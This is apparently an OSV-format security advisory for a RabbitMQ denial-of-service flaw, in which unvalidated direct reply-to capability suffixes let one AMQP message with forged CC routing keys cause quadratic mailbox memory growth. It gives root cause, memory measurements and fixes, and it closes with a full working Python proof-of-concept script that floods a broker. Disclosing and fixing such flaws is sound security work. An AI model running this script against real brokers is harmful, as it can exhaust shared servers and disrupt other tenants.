@@ -1,0 +1,63 @@
+{
+  "modified": "2026-08-18T03:08:48Z",
+  "published": "2026-08-18T03:08:48Z",
+  "schema_version": "1.5.0",
+  "id": "GHSA-6chv-gv3h-cvcj",
+  "details": "## Summary\r\n\r\nRabbitMQ direct reply-to addresses have the form:\r\n\r\n```text\r\namq.rabbitmq.reply-to.\u003cencoded-channel-or-session-pid\u003e.\u003ccapability-key\u003e\r\n```\r\n\r\nWhen resolving a destination, RabbitMQ decodes and validates the PID but\r\ndiscards the capability-key suffix. An attacker who obtains their own valid\r\ndirect reply-to address can create many distinct routing keys that preserve the\r\nencoded PID and replace only the suffix.\r\n\r\nA single message can carry these names through the AMQP `CC` header. RabbitMQ\r\ncreates one volatile target per distinct name and sends one cast per target to\r\nthe same channel/session PID. Every cast retains a copy of the message's full\r\n`O(N)` routing-key structure, producing `N × O(N) = O(N²)` mailbox memory.\r\n\r\nThe final capability-key check happens only after each cast reaches the target\r\nmailbox, too late to prevent amplification.\r\n\r\n## Preconditions\r\n\r\n- The attacker has an authenticated AMQP account.\r\n- The account can write to the default exchange.\r\n- The attacker activates direct reply-to and obtains its own generated reply\r\n  address. No victim address or cross-user information leak is required.\r\n\r\nThese are ordinary application permissions. No plugin or administrator role is\r\nrequired.\r\n\r\n## Root cause\r\n\r\n### 1. The suffix is parsed but never validated\r\n\r\n```erlang\r\n%% deps/rabbit/src/rabbit_volatile_queue.erl:368-389\r\npid_from_name(\u003c\u003c?PREFIX, Bin/binary\u003e\u003e, CandidateNodes) -\u003e\r\n    ...\r\n    [PidBase64, _KeyBase64] = binary:split(Bin, Cp),\r\n    PidBin = base64:decode(PidBase64),\r\n    ...\r\n    {ok, rabbit_pid_codec:recompose(PidParts)}\r\n```\r\n\r\nOnly the encoded PID contributes to the returned target.\r\n\r\n### 2. Distinct forged names become distinct targets\r\n\r\nThe default exchange resolves each CC routing key independently through\r\n`rabbit_db_queue:get_targets/1`. Names are different as binaries, so they are\r\nnot deduplicated even when they decode to the same PID.\r\n\r\n### 3. Every target receives the full message structure\r\n\r\n`rabbit_queue_type:deliver0/4` groups the volatile targets but retains the\r\nmessage carrying all routing keys. `rabbit_volatile_queue:deliver/3` then sends\r\none `queue_event` cast per target.\r\n\r\nThe target channel eventually notices the wrong capability key and drops each\r\nevent, but every event has already occupied mailbox memory.\r\n\r\n## Basic Python proof of concept\r\n\r\nAttached at the end of file: `dos-poc.py`\r\n\r\nRequirements:\r\n\r\n- Python 3 with `pika` (`python3 -m pip install pika`).\r\n- An already-running RabbitMQ server.\r\n- An ordinary account with configure/read/write permission in one vhost.\r\n- No RabbitMQ plugin or non-default server configuration.\r\n\r\nRun:\r\n\r\n```bash\r\npython3 dos-poc.py \\\r\n  --host rabbitmq.example --port 5672 --vhost / \\\r\n  --user poc --password pocpass \\\r\n  --count 800 --repeats 1\r\n```\r\n\r\nThe PoC uses only the AMQP network interface. It registers a real direct\r\nreply-to consumer, obtains the broker-expanded address through a normal RPC\r\nrequest, replaces the capability suffix with 800 distinct values, and sends\r\nthem in one `CC` header. Monitor RabbitMQ process memory while increasing\r\n`--count` or `--repeats`.\r\n\r\n`--count 800 --repeats 1` is the bounded validation setting. Larger values can\r\nterminate the broker.\r\n\r\nSuccessful delivery of the attack prints:\r\n\r\n```text\r\nsent iteration 1/1: 800 forged destinations target one broker channel\r\nPOC_SENT\r\n```\r\n\r\n### Independent Docker validation evidence\r\n\r\nThe attached network-only PoC does not require Docker or broker shell access.\r\nFor deterministic measurement, the finding was separately validated on stock\r\nRabbitMQ 4.3.4 by temporarily suspending only the attacker's own broker channel\r\nwhile sampling its mailbox:\r\n\r\n```text\r\nRabbitMQ 4.3.4\r\n\r\ncontrol n=400:\r\n  mailbox delta: 0\r\n  memory delta:  0 bytes\r\n\r\nattack n=200:\r\n  mailbox delta: 200\r\n  memory delta:  7,540,800 bytes\r\n\r\nattack n=400:\r\n  mailbox delta: 400\r\n  memory delta:  29,801,600 bytes\r\n  growth versus n=200: 3.95x\r\n\r\nattack n=800:\r\n  mailbox delta: 800\r\n  memory delta:  118,483,200 bytes\r\n  growth versus n=400: 3.98x\r\n\r\nASSERTIONS_OK\r\nPing succeeded\r\n```\r\n\r\nDoubling the number of forged suffixes increases memory by approximately four,\r\nwhich directly demonstrates quadratic scaling. The `N=800` message fits within\r\nnormal AMQP frame limits yet consumes approximately 118.5 MB in one target\r\nmailbox.\r\n\r\n## Impact\r\n\r\n- A low-privilege tenant can target its own channel/session and consume shared\r\n  broker memory, so no victim PID discovery is necessary.\r\n- Several bounded-size publishes across channels can exhaust a broker node.\r\n- Memory alarms do not prevent a single in-progress fanout from enqueuing the\r\n  complete burst.\r\n- The issue affects a core feature and can impact other vhosts and tenants on\r\n  the same node.\r\n\r\n## Recommended remediation\r\n\r\n- Validate the complete direct reply-to capability, including the random key,\r\n  before creating a volatile target or sending a cast.\r\n- Deduplicate resolved volatile targets by validated PID and capability.\r\n- Reject or bound the number and aggregate encoded size of CC/x-cc routing keys.\r\n- Charge flow credit for fanout work rather than only once per source message.\r\n- Add a regression asserting linear mailbox memory as CC count grows.\r\n\r\n```py\r\n#!/usr/bin/env python3\r\n\"\"\"RabbitMQ direct reply-to forged-suffix mailbox amplification PoC.\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport time\r\n\r\nimport pika\r\n\r\n\r\ndef connect(args: argparse.Namespace) -\u003e pika.BlockingConnection:\r\n    return pika.BlockingConnection(\r\n        pika.ConnectionParameters(\r\n            host=args.host,\r\n            port=args.port,\r\n            virtual_host=args.vhost,\r\n            credentials=pika.PlainCredentials(args.user, args.password),\r\n            heartbeat=600,\r\n            blocked_connection_timeout=120,\r\n        )\r\n    )\r\n\r\n\r\ndef obtain_reply_address(args: argparse.Namespace) -\u003e tuple[pika.BlockingConnection, str]:\r\n    requester = connect(args)\r\n    request_channel = requester.channel()\r\n    request_channel.basic_consume(\r\n        queue=\"amq.rabbitmq.reply-to\",\r\n        on_message_callback=lambda *_: None,\r\n        auto_ack=True,\r\n    )\r\n\r\n    responder = connect(args)\r\n    response_channel = responder.channel()\r\n    declared = response_channel.queue_declare(\r\n        queue=\"\", exclusive=True, auto_delete=True\r\n    )\r\n    request_queue = declared.method.queue\r\n\r\n    request_channel.basic_publish(\r\n        exchange=\"\",\r\n        routing_key=request_queue,\r\n        body=b\"discover generated reply address\",\r\n        properties=pika.BasicProperties(reply_to=\"amq.rabbitmq.reply-to\"),\r\n    )\r\n\r\n    deadline = time.time() + 10\r\n    reply_to = None\r\n    while time.time() \u003c deadline:\r\n        method, properties, _ = response_channel.basic_get(\r\n            queue=request_queue, auto_ack=True\r\n        )\r\n        if method:\r\n            reply_to = properties.reply_to\r\n            break\r\n        time.sleep(0.05)\r\n    responder.close()\r\n\r\n    if not reply_to or not reply_to.startswith(\"amq.rabbitmq.reply-to.\"):\r\n        requester.close()\r\n        raise RuntimeError(f\"broker did not expand direct reply-to: {reply_to!r}\")\r\n    return requester, reply_to\r\n\r\n\r\ndef main() -\u003e int:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"--host\", default=\"127.0.0.1\")\r\n    parser.add_argument(\"--port\", type=int, default=5672)\r\n    parser.add_argument(\"--vhost\", default=\"/\")\r\n    parser.add_argument(\"--user\", required=True)\r\n    parser.add_argument(\"--password\", required=True)\r\n    parser.add_argument(\"--count\", type=int, default=800)\r\n    parser.add_argument(\"--repeats\", type=int, default=1)\r\n    args = parser.parse_args()\r\n\r\n    requester, reply_to = obtain_reply_address(args)\r\n    pid_prefix, _real_capability = reply_to.rsplit(\".\", 1)\r\n    forged = [\r\n        f\"{pid_prefix}.forged-{index:05d}\"\r\n        for index in range(args.count)\r\n    ]\r\n\r\n    publisher = connect(args)\r\n    channel = publisher.channel()\r\n    channel.confirm_delivery()\r\n    for iteration in range(args.repeats):\r\n        confirmed = channel.basic_publish(\r\n            exchange=\"\",\r\n            routing_key=\"poc.no-such-queue\",\r\n            body=b\"x\",\r\n            properties=pika.BasicProperties(headers={\"CC\": forged}),\r\n        )\r\n        if confirmed is False:\r\n            raise RuntimeError(\"broker negatively acknowledged the PoC publish\")\r\n        print(\r\n            f\"sent iteration {iteration + 1}/{args.repeats}: \"\r\n            f\"{args.count} forged destinations target one broker channel\"\r\n        )\r\n\r\n    publisher.close()\r\n    requester.close()\r\n    print(f\"generated reply address: {reply_to}\")\r\n    print(\"POC_SENT\")\r\n    print(\"Monitor RabbitMQ process memory while increasing --count or --repeats.\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())\r\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "rabbitmq",
+        "purl": "pkg:dhi/rabbitmq"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "4.2.0"
+            },
+            {
+              "fixed": "4.2.10"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "other",
+        "source_package": "rabbitmq-server"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "rabbitmq",
+        "purl": "pkg:dhi/rabbitmq"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "4.3.0"
+            },
+            {
+              "fixed": "4.3.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "other",
+        "source_package": "rabbitmq-server"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/rabbitmq/rabbitmq-server/security/advisories/GHSA-6chv-gv3h-cvcj"
+    }
+  ]
+}
